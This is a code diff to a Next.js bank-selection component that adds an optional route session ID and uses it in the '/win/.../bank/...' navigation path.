@@ -6,18 +6,21 @@ import { ConfigMissing } from "@/components/demo/ConfigMissing";
 import { optimizeSupabaseImageUrl } from "@/lib/asset-url";
 import type { BankCatalogEntry } from "@/lib/at-bank-catalog";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
+import { getPreferredRouteSessionId } from "@/lib/session-id-client";
 import { useSettings } from "@/contexts/SettingsContext";
 import { countriesMatch } from "@/lib/country-utils";
 
 type Props = {
   sessionId: string;
+  routeSessionId?: string;
   initialBanks: BankCatalogEntry[];
 };
 
-export function BankenClientClean({ sessionId, initialBanks }: Props) {
+export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: Props) {
   const router = useRouter();
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const { settings, loading: settingsLoading } = useSettings();
+  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
   const [banks, setBanks] = useState<BankCatalogEntry[]>(initialBanks);
   const [bankSlug, setBankSlug] = useState("");
   const [searchTerm, setSearchTerm] = useState("");
@@ -218,7 +221,7 @@ export function BankenClientClean({ sessionId, initialBanks }: Props) {
     }
     else {
       setSessionFormData(nextFormData);
-      router.push(`/win/${sessionId}/bank/${nextBankSlug}`);
+      router.push(`/win/${effectiveRouteSessionId}/bank/${nextBankSlug}`);
     }
   }
 
